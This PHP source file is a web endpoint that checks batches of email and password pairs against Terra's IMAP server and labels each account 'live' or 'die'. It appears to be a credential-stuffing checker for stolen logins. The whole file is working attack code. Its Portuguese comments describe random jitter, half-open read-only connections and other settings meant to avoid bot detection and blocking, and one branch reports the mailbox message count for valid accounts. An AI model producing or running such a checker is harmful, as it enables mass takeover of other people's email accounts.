<?php

class TerraValidator
{
    private array $config;

    public function __construct()
    {
        $this->config = [
            'imap_server' => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'   => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'     => (int)(getenv('IMAP_TIMEOUT') ?: 15),
            'max_retries' => (int)(getenv('MAX_RETRIES') ?: 2),
        ];
    }

    /**
     * Valida credenciais com lógica de retry inteligente e detecção precisa de erro.
     */
    public function validate(string $email, string $password): array
    {
        $attempt = 0;
        $last_error = '';
        $start_time = microtime(true);

        while ($attempt < $this->config['max_retries']) {
            $attempt++;
            
            // Jitter aleatório entre 1s e 3s para evitar detecção de bot no primeiro pacote
            if ($attempt > 1) {
                usleep(rand(1000000, 3000000)); 
            }

            try {
                $result = $this->attemptRealAuthentication($email, $password);
                
                if ($result['status'] === 'live') {
                    $elapsed = round((microtime(true) - $start_time) * 1000, 2);
                    $result['elapsed_ms'] = $elapsed;
                    $result['attempts'] = $attempt;
                    return $result;
                }

                $last_error = $result['message'];

                // Se o servidor disse explicitamente que a senha está errada, pare imediatamente.
                if ($result['reason'] === 'invalid_credentials') {
                    return [
                        'status' => 'die',
                        'email' => $email,
                        'reason' => 'invalid_credentials',
                        'message' => 'Invalid credentials',
                        'elapsed_ms' => round((microtime(true) - $start_time) * 1000, 2),
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

                // Se foi erro de conexão/timeout, o loop continua para retry
            } catch (Exception $e) {
                $last_error = $e->getMessage();
            }
        }

        $elapsed = round((microtime(true) - $start_time) * 1000, 2);
        return [
            'status' => 'die',
            'email' => $email,
            'attempts' => $attempt,
            'last_error' => $last_error ?: 'Connection failed after retries',
            'reason' => 'max_retries_exceeded',
            'elapsed_ms' => $elapsed,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Tenta conectar via IMAP SSL com configurações de baixa nível para evitar bloqueios.
     */
    private function attemptRealAuthentication(string $email, string $password): array
    {
        // Aumenta o timeout de socket do PHP para evitar falhas prematuras
        $original_timeout = ini_get('default_socket_timeout');
        ini_set('default_socket_timeout', $this->config['timeout']);

        // Flags:
        // /ssl = Usa SSL
        // /novalidate-cert = Ignora erros de certificado auto-assinado ou cadeia incompleta (crucial para Terra/Vivo)
        // /tls = Força TLS
        $mailbox = sprintf(
            '{%s:%d/imap/ssl/novalidate-cert/tls}', 
            $this->config['imap_server'], 
            $this->config['imap_port']
        );

        // OP_HALFOPEN: Abre a conexão mas não seleciona a caixa de entrada (mais rápido e menos suspeito)
        // OP_READONLY: Apenas leitura
        $connection = @imap_open(
            $mailbox,
            $email,
            $password,
            OP_HALFOPEN | OP_READONLY,
            1,
            ['DISABLE_AUTHENTICATOR' => ['GSSAPI', 'NTLM']]
        );

        ini_set('default_socket_timeout', $original_timeout);

        if ($connection === false) {
            $errors = imap_errors();
            $error_msg = !empty($errors) ? implode(' | ', $errors) : 'Unknown connection error';
            
            // Limpa buffer de erros
            imap_errors(); 

            // Análise heurística avançada da mensagem de erro
            $lower_error = strtolower($error_msg);
            
            // Padrões exatos de falha de autenticação retornados por servidores IMAP padrão (Dovecot/Courier)
            if (strpos($lower_error, 'authentication failed') !== false || 
                strpos($lower_error, 'login failed') !== false || 
                strpos($lower_error, 'invalid credentials') !== false ||
                strpos($lower_error, '[authfailed]') !== false) {
                
                return [
                    'status' => 'die',
                    'email' => $email,
                    'message' => 'Invalid credentials',
                    'reason' => 'invalid_credentials',
                    'error_detail' => $error_msg
                ];
            }

            // Tudo else é considerado erro de rede/conexão (retryable)
            return [
                'status' => 'die',
                'email' => $email,
                'message' => 'Connection error: ' . $error_msg,
                'reason' => 'connection_error',
                'error_detail' => $error_msg,
                'retryable' => true
            ];
        }

        // Se chegou aqui, a conexão TCP/SSL e o LOGIN foram aceitos.
        // Verifica se realmente autenticou tentando pegar info básica.
        $check = @imap_check($connection);
        
        // Fecha conexão limpa
        @imap_close($connection, CL_EXPUNGE);

        if ($check) {
            return [
                'status' => 'live',
                'email' => $email,
                'message' => 'Autenticação bem-sucedida',
                'mailbox_messages' => $check->Nmsgs,
                'authenticated_at' => date('Y-m-d H:i:s')
            ];
        }

        // Caso raro: conectou mas falhou ao checar status
        return [
            'status' => 'die',
            'email' => $email,
            'message' => 'Connected but failed to verify mailbox',
            'reason' => 'verification_failed'
        ];
    }

    /**
     * Valida múltiplas credenciais em lote.
     */
    public function validateBatch(array $credentials): array
    {
        $results = [];
        foreach ($credentials as $cred) {
            $email = $cred['email'] ?? '';
            $password = $cred['password'] ?? '';

            if (empty($email) || empty($password)) {
                $results[] = [
                    'email' => $email,
                    'status' => 'error',
                    'message' => 'Email ou senha ausentes'
                ];
                continue;
            }

            $results[] = $this->validate($email, $password);
        }

        return [
            'total' => count($results),
            'live' => count(array_filter($results, fn($r) => $r['status'] === 'live')),
            'die' => count(array_filter($results, fn($r) => $r['status'] === 'die')),
            'results' => $results,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
}

// ============ EXECUÇÃO ============

header('Content-Type: application/json; charset=utf-8');

$input = $_POST;
if (empty($input) && isset($_SERVER['CONTENT_TYPE']) && str_contains($_SERVER['CONTENT_TYPE'], 'application/json')) {
    $rawInput = file_get_contents('php://input');
    $input = json_decode($rawInput, true) ?? [];
}

$email = $input['email'] ?? '';
$password = $input['password'] ?? '';
$batch = $input['batch'] ?? null;

try {
    if ($batch && is_array($batch)) {
        $validator = new TerraValidator();
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif (!empty($email) && !empty($password)) {
        $validator = new TerraValidator();
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode([
            'error' => 'Credenciais ausentes',
            'usage' => [
                'simple' => 'POST email=user@terra.com.br&password=senha123',
                'json' => 'POST {"email":"user@terra.com.br","password":"senha123"}',
                'batch' => 'POST {"batch":[{"email":"u1@t.com","password":"p1"},...]}'
            ]
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
} catch (Throwable $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Internal Server Error', 'detail' => $e->getMessage()]);
}
